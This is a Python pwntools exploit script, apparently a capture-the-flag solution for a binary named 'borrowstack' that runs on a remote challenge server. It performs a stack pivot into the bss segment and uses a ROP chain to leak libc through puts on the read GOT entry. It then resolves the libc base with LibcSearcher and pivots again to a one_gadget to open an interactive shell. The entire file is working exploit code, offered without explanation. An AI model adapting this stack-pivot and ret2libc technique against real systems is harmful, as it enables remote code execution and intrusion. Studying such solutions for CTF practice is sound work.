#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./borrowstack')
p = remote('123.56.85.29',3635)
p = remote('node3.buuoj.cn',25044)
elf = ELF('borrowstack')
context.log_level = 'debug'
#gdb.attach(p,'b *0x0000000000400699')

leave_ret = 0x0000000000400699
read_got = elf.got['read']
bss = 0x601080 + 0x30
pop_rdi_ret = 0x0000000000400703
puts_plt = elf.symbols['puts']
main_puts = 0x000400656

###stack provit to leak###
p.recvuntil('elcome to Stack bank,Tell me what you want\n')
payload = 'A' * 96 + p64(bss) + p64(leave_ret)
p.send(payload)


p.recvuntil('Done!You can check and use your borrow stack now!\n')
payload ='A' * 0x30 + p64(bss) +  p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(main_puts)
p.send(payload)

read = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = LibcSearcher('read',read)

libc_base = read - libc.dump('read')
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')
gadget = libc_base + 0x4526a

###stack provit to getshell###
bss = 0x601080 + 0x30

p.recvuntil('elcome to Stack bank,Tell me what you want\n')
payload = 'A' * 96 + p64(bss) + p64(leave_ret)
p.send(payload)

p.recvuntil('Done!You can check and use your borrow stack now!\n')
payload ='A' * 0x30 + p64(bss) +  p64(gadget)
#payload = 'A' * 0x30 + p64(bss) + p64(pop_rdi_ret) + p64(system) + p64(sh)
p.send(payload)

###get shell###
p.interactive()
